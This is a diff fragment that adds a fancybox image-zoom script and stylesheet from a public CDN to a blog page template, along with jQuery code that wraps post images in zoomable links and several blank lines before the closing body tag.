+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
